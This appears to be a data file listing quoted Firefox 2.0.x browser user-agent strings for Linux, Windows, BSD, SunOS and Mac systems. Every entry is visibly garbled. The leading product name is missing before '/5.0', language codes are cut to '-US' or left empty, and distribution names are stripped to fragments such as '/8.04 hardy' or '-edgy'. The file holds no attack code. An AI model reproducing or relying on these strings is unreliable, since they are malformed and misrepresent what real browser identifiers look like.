	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.20 Gecko/20090206 Firefox/2.0.0.20"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.8.1.20 Gecko/20090413 Firefox/2.0.0.20"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.8.1.20 Gecko/20090225 Firefox/2.0.0.20"
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20 GTB5"
	"/5.0 Windows; U; Windows NT 6.1; -GB; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 Windows; U; Windows NT 6.0; zh-TW; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 Windows; U; Windows NT 6.0; ko; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20  .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 6.0; cs; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20 .NET CLR 3.5.30729"
	"/5.0 Windows; U; Windows NT 5.2; -GB; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.20"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.2 Gecko/20070226 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux; -US; rv:1.8.1.2 Gecko/20070219 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux x86_64; ; rv:1.8.1.2 Gecko/20060601 Firefox/2.0.0.2 -edgy"
	"/5.0 X11; U; Linux i686; sv-SE; rv:1.8.1.2 Gecko/20061023 SUSE/2.0.0.2-1.1 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1.2 Gecko/20070220 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1.2 Gecko/20060601 Firefox/2.0.0.2 -edgy"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.2 Gecko/20070220 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.2 Gecko/20060601 Firefox/2.0.0.2 -edgy"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.2 Gecko/20070225 Firefox/2.0.0.2 Swiftfox"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.2 Gecko/20070220 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.2 Gecko/20060601 Firefox/2.0.0.2 -edgy"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.2 Gecko/20070220 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20070317 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20070314 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20070226 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20070225 Firefox/2.0.0.2 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20070221 SUSE/2.0.0.2-6.1 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20070220 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20061201 Firefox/2.0.0.2 -feisty"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.2 Gecko/20061201 Firefox/2.0.0.2"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.19 Gecko/20081213 SUSE/2.0.0.19-0.1 Firefox/2.0.0.19"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.19 Gecko/20081216 /7.10 gutsy Firefox/2.0.0.19"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.19 Gecko/20081230 Firefox/2.0.0.19"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.19 Gecko/20081216 /2.0.0.19-1.fc8 Firefox/2.0.0.19 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.19 Gecko/20081213 SUSE/2.0.0.19-0.1 Firefox/2.0.0.19"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.19 Gecko/20081213 SUSE/2.0.0.19-0.1 Firefox/2.0.0.19"
	"/5.0 Windows; U; Windows NT 6.0; zh-CN; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.19"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.8.1.20 Gecko/20081217 Firefox/2.0.0.19"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1.19 Gecko/20081201 Firefox/2.0.0.19"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.18 Gecko/20081113 /8.04 hardy Firefox/2.0.0.18"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.18 Gecko/20081112 /2.0.0.18-1.fc8 Firefox/2.0.0.18"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.18 Gecko/20081113 /8.04 hardy Firefox/2.0.0.18"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.18 Gecko/20081112 /2.0.0.18-1.fc8 Firefox/2.0.0.18"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.18 Gecko/20080921 SUSE/2.0.0.18-0.1 Firefox/2.0.0.18"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.18 Gecko/20081029 Firefox/2.0.0.18"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1.18 Gecko/20081029 Firefox/2.0.0.18"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.8.1.18 Gecko/20081029 Firefox/2.0.0.18"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.18 Gecko/20081029 Firefox/2.0.0.18"
	"/5.0 Windows; U; Windows NT 5.1; cs; rv:1.8.1.18 Gecko/20081029 Firefox/2.0.0.18"
	"/5.0 Macintosh; U; PPC Mac OS X 10.4; -US; rv:1.9.0.4 Gecko/20081029  Firefox/2.0.0.18"
	"/5.0 X11; U; Linux sparc64; -US; rv:1.8.1.17 Gecko/20081108 Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.17 Gecko/20080924 /8.04 hardy Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.17 Gecko/20080922 /7.10 gutsy Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.17 Gecko/20080921 SUSE/2.0.0.17-1.2 Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.17 Gecko/20080703 /2.0.0.17-1.1mdv2008.1 2008.1 Firefox/2.0.0.17"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 6.0; pl; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.1.14 Gecko/20080404 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.1; zh-CN; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.1; sv-SE; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.1; pl; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.3 Gecko/2008092417 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.0; fr; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 Windows; U; Windows NT 5.0; ; rv:1.8.1.17 Gecko/20080829 Firefox/2.0.0.17"
	"/5.0 U; Windows NT 5.1; -GB; rv:1.8.1.17 Gecko/20080808 Firefox/2.0.0.17"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.16 Gecko/20080812 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.8.1.16 Gecko/20080715 /2.0.0.16-1.fc8 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.16 Gecko/20080719 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.16 Gecko/20080718 /8.04 hardy Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.16 Gecko/20080722 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.16 Gecko/20080718 /8.04 hardy Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.16 Gecko/20080715 /7.10 gutsy Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.16 Gecko/20080715 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.16 Gecko/20080715 /2.0.0.16-1.fc8 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.16 Gecko/20080715 /7.10 gutsy Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.16 Gecko/20080718 /8.04 hardy Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686 x86_64; fr; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.16 Gecko/20080716 Firefox/2.0.0.16"
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 Windows; U; Windows NT 6.0; fr; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 Windows; U; Windows NT 6.0; -US; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 Windows; U; Windows NT 6.0; -GB; rv:1.8.1.16 Gecko/20080702 Firefox/2.0.0.16"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.15 Gecko/20080702 /8.04 hardy Firefox/2.0.0.15"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.15 Gecko/20080702 /8.04 hardy Firefox/2.0.0.15"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.15 Gecko/20061201 Firefox/2.0.0.15 -feisty"
	"/5.0 Windows; U; Windows NT 6.0; sv-SE; rv:1.8.1.15 Gecko/20080623 Firefox/2.0.0.15"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.2 Gecko/20090729 Firefox/2.0.0.15"
	"/5.0 Windows; U; Windows NT 5.2; sk; rv:1.8.1.15 Gecko/20080623 Firefox/2.0.0.15"
	"/5.0 Windows; U; Windows NT 5.1; -BR; rv:1.8.1.15 Gecko/20080623 Firefox/2.0.0.15"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.8.1.15 Gecko/20080623 Firefox/2.0.0.15"
	"/5.0 Macintosh; U; PPC Mac OS X Mach-O; ; rv:1.8.1.15 Gecko/20080623 Firefox/2.0.0.15"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.14 Gecko/20080418 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux x86_64; ; rv:1.8.1.14 Gecko/20080416 /2.0.0.14-1.fc7 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.6 Gecko/2010012717 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux ppc64; -US; rv:1.8.1.14 Gecko/20080418 /7.10 gutsy Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.14 Gecko/20080420 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.14 Gecko/20080416 /2.0.0.14-1.fc7 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.14 Gecko/20080419 /8.04 hardy Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.1.14 Gecko/20080404 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080525 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080508 /8.04 hardy Firefox/2.0.0.14 Linux "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080428 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080423 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080417 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080416 /2.0.0.14-1.fc8 Firefox/2.0.0.14 pango-"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080410 SUSE/2.0.0.14-0.4 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080404 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20061201 Firefox/2.0.0.14 -feisty"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.14 Gecko/20080418 /7.10 gutsy Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.14 Gecko/20080410 SUSE/2.0.0.14-0.1 Firefox/2.0.0.14"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.14 Gecko/20080417 Firefox/2.0.0.14"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13"
	"/5.0 X11; U; Linux x86_64; pl-PL; rv:1.8.1.13 Gecko/20080325 /7.10 gutsy Firefox/2.0.0.13"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.13 Gecko/20080208 /2.0.0.13-1mdv2008.1 2008.1 Firefox/2.0.0.13"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.13 Gecko/20080330 /7.10 gutsy Firefox/2.0.0.13 Linux "
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.13 Gecko/20080325 Firefox/2.0.0.13"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.13 Gecko/20080316 SUSE/2.0.0.13-1.1 Firefox/2.0.0.13"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.13 Gecko/20080316 SUSE/2.0.0.13-0.1 Firefox/2.0.0.13"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.13 Gecko/20061201 Firefox/2.0.0.13 -feisty"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.13 Gecko/20080325 /7.10 gutsy Firefox/2.0.0.13"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13"
	"/5.0 X11; U; Linux i686 Gentoo; -US; rv:1.8.1.13 Gecko/20080413 Firefox/2.0.0.13 Gentoo Linux"
	"/5.0 Windows; U; Windows NT 6.0; es-ES; rv:1.8.1.14 Gecko/20080404 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 5.2; -GB; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 5.1; fr; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13 .NET CLR 3.0.04506.30"
	"/5.0 Windows; U; Windows NT 5.1; fr-FR; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.14 Gecko/20080404 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 5.1; es-AR; rv:1.8.1.13 Gecko/20080311 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.9.0.1 Gecko/2008070208 Firefox/2.0.0.13"
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.1.11 Gecko/20071127 Firefox/2.0.0.13"
	"/5.0 Macintosh; U; Intel Mac OS X; -US; rv: Gecko/20080122 Firefox/"
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.8.1.12 Gecko/20080201 Firefox/2.0.0.12; MEGAUPLOAD 2.0"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.12 Gecko/20080210 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.0.1 Gecko/2008072610 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.12 Gecko/20080214 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.12 Gecko/20080203 SUSE/2.0.0.12-0.1 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.8.1.12 Gecko/20080207 /7.10 gutsy Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; -GB; rv:1.8.1.12 Gecko/20080203 SUSE/2.0.0.12-0.1 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; ; rv:1.8.1.12 Gecko/20080208 /2.0.0.12-1.fc8 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86_64; ; rv:1.8.1.12 Gecko/20080203 SUSE/2.0.0.12-6.1 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux x86; sv-SE; rv:1.8.1.12 Gecko/20080207 /8.04 hardy Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.12 Gecko/20080208 /2.0.0.12-1.fc8 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; fr-FR; rv:1.8.1.6 Gecko/20080208 /7.10 gutsy Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; es-ES; rv:1.8.1.12 Gecko/20080213 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.1.12 Gecko/20080207 /7.10 gutsy Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.14 Gecko/20080419 /8.04 hardy Firefox/2.0.0.12 MEGAUPLOAD 1.0"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.12 Gecko/20080208 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.12 Gecko/20080208 /2.0.0.12-1.fc8 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.12 Gecko/20080201 Firefox/2.0.0.12 Mnenhy/0.7.5.666"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.12 Gecko/20080129 Firefox/2.0.0.12 -2.0.0.12-0etch1"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.12 Gecko/20080203 SUSE/2.0.0.12-2.1 Firefox/2.0.0.12"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.12 Gecko/20080207 /7.10 gutsy Firefox/2.0.0.12"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1.11 Gecko/20080118 Firefox/2.0.0.11"
	"/5.0 X11; U; OpenBSD i386; -US; rv:1.8.1.4 Gecko/20071127 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux x86_64; zh-TW; rv:1.8.1.11 Gecko/20071204 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.8.1.11 Gecko/20071127 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.11 Gecko/20071201 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.11 Gecko/20071127 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.11 Gecko/20070914 /2.0.0.11-1.1mdv2008.0 2008.0 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -RU; rv:1.8.1.11 Gecko/20071201 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -PT; rv:1.8.1.11 Gecko/20071204 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.11 Gecko/20071128 Firefox/2.0.0.11 -2.0.0.11-1"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.11 Gecko/20071127 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -JP; rv:1.8.1.11 Gecko/20071204 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.8 Gecko/20071022 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.6 Gecko/20071008 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; es-AR; rv:1.8.1.11 Gecko/20071204 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.11 Gecko/20071216 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.11 Gecko/20080201 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.11 Gecko/20071217 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.11 Gecko/20071204 /7.10 gutsy Firefox/2.0.0.11"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.11 Gecko/20071204 Firefox/2.0.0.11"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.10 Gecko/20061201 Firefox/2.0.0.10 -feisty"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1.10 Gecko/20071213 /2.0.0.10-3.fc8 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1.10 Gecko/20071128 /2.0.0.10-2.fc7 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; pl-PL; rv:1.8.1.10 Gecko/20071126 /7.10 gutsy Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.17 Gecko/20080827 Firefox/2.0.0.10 -2.0.0.17-0etch1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071213 /2.0.0.10-3.fc8 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071203 /7.10 gutsy Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071128 /2.0.0.10-2.fc7 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071126 /7.10 gutsy Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071115 Firefox/2.0.0.10 -2.0.0.10-0etch1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071115 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20071015 SUSE/2.0.0.10-0.2 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20061201 Firefox/2.0.0.10 -feisty"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.10 Gecko/20060601 Firefox/2.0.0.10 -edgy"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.10 Gecko/20071126 /7.10 gutsy Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.10 Gecko/20071126 /7.10 gutsy Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.10 Gecko/20071115 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.10 Gecko/20071015 SUSE/2.0.0.10-0.2 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.10 Gecko/20071015 SUSE/2.0.0.10-0.1 Firefox/2.0.0.10"
	"/5.0 X11; U; FreeBSD i386; -US; rv:1.8.1.4 Gecko/20070515 Firefox/2.0.0.10"
	"/5.0 X11; U; Linux x86_64; fr; rv:1.8.1.1 Gecko/20060601 Firefox/2.0.0.1 -edgy"
	"/5.0 X11; U; Linux x86_64; fi-FI; rv:1.8.1.1 Gecko/20060601 Firefox/2.0.0.1 -edgy"
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.1 Gecko/20060601 Firefox/2.0.0.1 -edgy"
	"/5.0 X11; U; Linux i686; -BR; rv:1.8.1.1 Gecko/20061208 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; pl; rv:1.8.1.1 Gecko/20061204 Firefox/2.0.0.1 -edgy"
	"/5.0 X11; U; Linux i686; nl; rv:1.8.1.1 Gecko/20070311 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.1 Gecko/20061208 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; fr; rv:1.8.1.1 Gecko/20060601 Firefox/2.0.0.1 -edgy"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.3 Gecko/20061201 Firefox/2.0.0.1 -feisty"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20070224 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20070110 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061220 Firefox/2.0.0.1 Swiftfox"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061208 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Firefox/2.0.0.1 -2.0.0.1+-2"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20060601 Firefox/2.0.0.1 -edgy"
	"/5.0 X11; U; Linux i686; -GB; rv: Gecko/20061023 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; -GB; rv:1.8.1.1 Gecko/20061208 Firefox/2.0.0.1"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.1 Gecko/20061220 Firefox/2.0.0.1 Swiftfox"
	"/5.0 X11; U; Linux i686; ; rv:1.8.1.1 Gecko/20061205 Firefox/2.0.0.1 -2.0.0.1+-2"
	"/5.0 X11; U; SunOS ; -DE; rv:1.9.1b4 Gecko/20090428 Firefox/2.0.0.0"
	"/5.0 X11; Linux x86_64; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 X11; Linux i686; U; pl; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 Windows; U; Windows NT 5.0; -US; rv:1.8.1.4 Gecko/20070509 Firefox/2.0.0"
	"/5.0 Windows NT 6.1; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 Windows NT 6.0; U; tr; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 Windows NT 6.0; U; sv; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 Windows NT 6.0; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 Macintosh; PPC Mac OS X; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 Linux i686; U; ; rv:1.8.1 Gecko/20061208 Firefox/2.0.0"
	"/5.0 X11;U;Linux i686;-US;rv:1.8.1 Gecko/2006101022 Firefox/2.0"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1 Gecko/20061228 Firefox/2.0"
	"/5.0 X11; U; SunOS ; -US; rv:1.8.1 Gecko/20061024 Firefox/2.0"
	"/5.0 X11; U; SunOS i86pc; -US; rv:1.8.1 Gecko/20061211 Firefox/2.0"
